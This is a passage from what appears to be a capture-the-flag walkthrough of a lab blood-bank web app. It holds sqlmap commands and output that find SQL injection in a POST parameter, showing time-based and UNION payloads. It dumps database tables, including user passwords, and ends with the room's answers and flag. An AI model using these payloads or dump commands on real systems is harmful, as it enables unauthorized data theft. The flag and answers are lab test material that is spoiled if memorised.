Referer: http://10.10.60.177/blood/nl-search.php
Cookie: PHPSESSID=j0nsjv2qg4qfbbnappstgqqo61
Upgrade-Insecure-Requests: 1

blood_group=A%2B

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ sqlmap -r req.txt -p blood_group --dbs                      
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:12:39 /2023-02-04/

[22:12:39] [INFO] parsing HTTP request from 'req.txt'
[22:12:40] [INFO] testing connection to the target URL
[22:12:40] [INFO] testing if the target URL content is stable
[22:12:41] [INFO] target URL content is stable
[22:12:41] [WARNING] heuristic (basic) test shows that POST parameter 'blood_group' might not be injectable
[22:12:42] [INFO] testing for SQL injection on POST parameter 'blood_group'
[22:12:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:12:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:12:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:12:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:12:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:12:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:12:49] [INFO] testing 'Generic inline queries'
[22:12:49] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:12:49] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                        
[22:12:50] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:12:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:12:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:13:04] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:13:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:13:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:13:13] [WARNING] reflective value(s) found and filtering out
[22:13:16] [INFO] target URL appears to be UNION injectable with 8 columns
[22:13:17] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=A+' AND (SELECT 2957 FROM (SELECT(SLEEP(5)))lpcx) AND 'MmpH'='MmpH

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a7871,0x56626a6a7256627368576e504570586a707552505a51447064644a656a6170594762497163625a66,0x7176707671),NULL,NULL-- -
---
[22:13:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[22:13:29] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test

[22:13:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.60.177'

[*] ending @ 22:13:30 /2023-02-04/

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ sqlmap -r req.txt -p blood_group -D blood --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:14:17 /2023-02-04/

[22:14:17] [INFO] parsing HTTP request from 'req.txt'
[22:14:18] [INFO] resuming back-end DBMS 'mysql' 
[22:14:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=A+' AND (SELECT 2957 FROM (SELECT(SLEEP(5)))lpcx) AND 'MmpH'='MmpH

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a7871,0x56626a6a7256627368576e504570586a707552505a51447064644a656a6170594762497163625a66,0x7176707671),NULL,NULL-- -
---
[22:14:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[22:14:18] [INFO] fetching tables for database: 'blood'
[22:14:19] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+

[22:14:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.60.177'

[*] ending @ 22:14:19 /2023-02-04/

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ sqlmap -r req.txt -p blood_group -D blood --dump-all
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:14:55 /2023-02-04/

[22:14:55] [INFO] parsing HTTP request from 'req.txt'
[22:14:56] [INFO] resuming back-end DBMS 'mysql' 
[22:14:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=A+' AND (SELECT 2957 FROM (SELECT(SLEEP(5)))lpcx) AND 'MmpH'='MmpH

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a7871,0x56626a6a7256627368576e504570586a707552505a51447064644a656a6170594762497163625a66,0x7176707671),NULL,NULL-- -
---
[22:14:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[22:14:56] [INFO] fetching tables for database: 'blood'
[22:14:56] [INFO] fetching columns for table 'users' in database 'blood'
[22:14:57] [WARNING] reflective value(s) found and filtering out
[22:14:57] [INFO] fetching entries for table 'users' in database 'blood'
Database: blood
Table: users
[3 entries]
+----+------------+---------+-----------+----------+----------+-----------+-------------+--------------+-------------------+
| id | dob        | gender  | address   | password | username | full_name | blood_group | phone_number | email_address     |
+----+------------+---------+-----------+----------+----------+-----------+-------------+--------------+-------------------+
| 1  | 12/12/1996 | <blank> | Kathmandu | nare     | nare     | nare      | O+          | 9800000000   | nare@nare.sqlmap  |
| 2  | 12/12/2222 | MALE    | google    | nare     | nare     | google    | A+          | 12345555     | google@google.com |
| 3  | 12/12/2021 | MALE    | google    | google   | google   | GOogle    | A+          | 1234567890   | google@gmail.com  |
+----+------------+---------+-----------+----------+----------+-----------+-------------+--------------+-------------------+

[22:14:57] [INFO] table 'blood.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.60.177/dump/blood/users.csv'
[22:14:57] [INFO] fetching columns for table 'blood_db' in database 'blood'
[22:14:58] [INFO] fetching entries for table 'blood_db' in database 'blood'
Database: blood
Table: blood_db
[1 entry]
+----+-----+------+--------+-----------+-------------+--------------+--------------------+
| id | Age | Name | Gender | Address   | blood_group | Phone_number | email_address      |
+----+-----+------+--------+-----------+-------------+--------------+--------------------+
| 1  | 27  | Nare | MALE   | Kathmandu | O+          | 9800000000   | nare@sqlmap.com.np |
+----+-----+------+--------+-----------+-------------+--------------+--------------------+

[22:14:58] [INFO] table 'blood.blood_db' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.60.177/dump/blood/blood_db.csv'
[22:14:58] [INFO] fetching columns for table 'flag' in database 'blood'
[22:14:58] [INFO] fetching entries for table 'flag' in database 'blood'
Database: blood
Table: flag
[1 entry]
+----+---------------------+------+
| id | flag                | name |
+----+---------------------+------+
| 1  | thm{sqlm@p_is_L0ve} | flag |
+----+---------------------+------+

[22:14:59] [INFO] table 'blood.flag' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.60.177/dump/blood/flag.csv'
[22:14:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.60.177'

[*] ending @ 22:14:59 /2023-02-04/

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ sqlmap -r req.txt -p blood_group -D blood --current-user
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:16:12 /2023-02-04/

[22:16:12] [INFO] parsing HTTP request from 'req.txt'
[22:16:12] [INFO] resuming back-end DBMS 'mysql' 
[22:16:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=A+' AND (SELECT 2957 FROM (SELECT(SLEEP(5)))lpcx) AND 'MmpH'='MmpH

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71787a7871,0x56626a6a7256627368576e504570586a707552505a51447064644a656a6170594762497163625a66,0x7176707671),NULL,NULL-- -
---
[22:16:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[22:16:13] [INFO] fetching current user
[22:16:13] [WARNING] reflective value(s) found and filtering out
current user: 'root@localhost'
[22:16:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.60.177'

[*] ending @ 22:16:13 /2023-02-04/

```


What is the name of the interesting directory ?

use gobuster

*blood*

Who is the current db user? 

*root*

What is the final flag? 

*thm{sqlm@p_is_L0ve}*


[[Insekube]]
